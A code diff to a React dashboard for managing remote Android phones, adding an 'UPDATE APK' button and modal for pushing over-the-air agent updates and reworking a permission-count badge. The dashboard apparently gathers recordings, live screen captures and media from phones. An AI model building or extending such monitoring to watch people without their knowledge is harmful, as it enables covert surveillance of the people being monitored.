@@ -12,6 +12,7 @@ import { RecordingsViewer } from './components/RecordingsViewer';
 import { LiveScreenEvidenceViewer } from './components/LiveScreenEvidenceViewer';
 import { DeviceMediaExplorer } from './components/DeviceMediaExplorer';
 import { DevicePermissionsViewer } from './components/DevicePermissionsViewer';
+import { AgentUpdateModal } from './components/AgentUpdateModal';
 import {
   Cast,
   Wifi,
@@ -32,6 +33,7 @@ import {
   FolderOpen,
   Download,
   Activity,
+  UploadCloud,
 } from 'lucide-react';
 import { Device, DevicePolicy, LogEntry } from './types';
 import { api } from './services/api';
@@ -62,6 +64,7 @@ export const App: React.FC = () => {
   const [isConnectingDevice, setIsConnectingDevice] = useState(false);
   const [isDisconnectingDevice, setIsDisconnectingDevice] = useState(false);
   const [checkingDeviceId, setCheckingDeviceId] = useState<string | null>(null);
+  const [isOtaModalOpen, setIsOtaModalOpen] = useState(false);
   const [liveCheckResult, setLiveCheckResult] = useState<{
     deviceId: string;
     online: boolean;
@@ -283,6 +286,18 @@ export const App: React.FC = () => {
         onlineCount={onlineCount}
         totalCount={devices.length}
         criticalCount={criticalCount}
+        onOpenOtaModal={() => setIsOtaModalOpen(true)}
+      />
+
+      <AgentUpdateModal
+        isOpen={isOtaModalOpen}
+        onClose={() => setIsOtaModalOpen(false)}
+        selectedDeviceId={selectedDevice?.deviceId}
+        selectedDeviceName={selectedDevice?.deviceName}
+        onReleaseUpdated={(message, type) => {
+          setConnectionNotice({ type, message });
+          setTimeout(() => setConnectionNotice(null), 8000);
+        }}
       />
 
       <main className="flex-1 p-6 max-w-7xl w-full mx-auto space-y-6">
@@ -376,19 +391,29 @@ export const App: React.FC = () => {
                         SLOW INTERNET
                       </span>
                     )}
-                    {selectedDevice.permissions && (
-                      <button
-                        onClick={() => setActiveTab('policy')}
-                        className={`text-[10px] px-2 py-0.5 rounded-lg font-mono font-bold flex items-center gap-1 transition-all ${
-                          Object.values(selectedDevice.permissions).filter(Boolean).length === 8
-                            ? 'bg-emerald-950/80 text-emerald-300 border border-emerald-500/50 shadow-[0_0_10px_rgba(16,185,129,0.2)]'
-                            : 'bg-amber-950/80 text-amber-300 border border-amber-500/50 shadow-[0_0_10px_rgba(245,158,11,0.2)]'
-                        }`}
-                        title="Click to view permissions & policies"
-                      >
-                        <Shield className="w-3 h-3 text-cyan-400" />
-                        <span>{Object.values(selectedDevice.permissions).filter(Boolean).length}/8 PERMS</span>
-                      </button>
+                    {selectedDevice.permissions && (() => {
+                      const permVals = Object.values(selectedDevice.permissions).filter((v) => typeof v === 'boolean');
+                      const granted = permVals.filter(Boolean).length;
+                      const total = permVals.length || 8;
+                      return (
+                        <button
+                          onClick={() => setActiveTab('policy')}
+                          className={`text-[10px] px-2 py-0.5 rounded-lg font-mono font-bold flex items-center gap-1 transition-all ${
+                            granted === total
+                              ? 'bg-emerald-950/80 text-emerald-300 border border-emerald-500/50 shadow-[0_0_10px_rgba(16,185,129,0.2)]'
+                              : 'bg-amber-950/80 text-amber-300 border border-amber-500/50 shadow-[0_0_10px_rgba(245,158,11,0.2)]'
+                          }`}
+                          title="Click to view permissions & policies"
+                        >
+                          <Shield className="w-3 h-3 text-cyan-400" />
+                          <span>{granted}/{total} PERMS</span>
+                        </button>
+                      );
+                    })()}
+                    {selectedDevice.appVersionName && (
+                      <span className="text-[10px] px-2 py-0.5 rounded-lg font-mono font-bold bg-slate-900 text-cyan-300 border border-slate-700">
+                        v{selectedDevice.appVersionName}
+                      </span>
                     )}
                   </div>
 
@@ -426,6 +451,16 @@ export const App: React.FC = () => {
                     <Activity className="w-4 h-4 text-cyan-400" />
                   )}
                   <span>{checkingDeviceId === selectedDevice.deviceId ? 'CHECKING...' : 'CHECK ONLINE'}</span>
+                </button>
+
+                {/* Push / Upload OTA Agent APK Button */}
+                <button
+                  onClick={() => setIsOtaModalOpen(true)}
+                  className="inline-flex items-center space-x-2 px-4 py-2.5 rounded-xl text-xs font-mono font-bold tracking-wider bg-indigo-950/80 hover:bg-indigo-900 text-indigo-200 border border-indigo-500/50 shadow-[0_0_12px_rgba(99,102,241,0.2)] transition-all active:scale-95"
+                  title="Upload a new APK release or push OTA update to this phone"
+                >
+                  <UploadCloud className="w-4 h-4 text-indigo-400" />
+                  <span>UPDATE APK</span>
                 </button>
 
                 {/* Immediate GET DATA Button */}
@@ -584,15 +619,20 @@ export const App: React.FC = () => {
               >
                 <Shield className="w-4 h-4 text-blue-400" />
                 <span>POLICIES &amp; PERMISSIONS</span>
-                {selectedDevice.permissions && (
-                  <span className={`text-[10px] px-1.5 py-0.2 rounded-md font-mono ${
-                    Object.values(selectedDevice.permissions).filter(Boolean).length === 8
-                      ? 'bg-emerald-900/80 text-emerald-300'
-                      : 'bg-amber-900/80 text-amber-300 animate-pulse'
-                  }`}>
-                    {Object.values(selectedDevice.permissions).filter(Boolean).length}/8
-                  </span>
-                )}
+                {selectedDevice.permissions && (() => {
+                  const permVals = Object.values(selectedDevice.permissions).filter((v) => typeof v === 'boolean');
+                  const granted = permVals.filter(Boolean).length;
+                  const total = permVals.length || 8;
+                  return (
+                    <span className={`text-[10px] px-1.5 py-0.2 rounded-md font-mono ${
+                      granted === total
+                        ? 'bg-emerald-900/80 text-emerald-300'
+                        : 'bg-amber-900/80 text-amber-300 animate-pulse'
+                    }`}>
+                      {granted}/{total}
+                    </span>
+                  );
+                })()}
               </button>
 
               <button
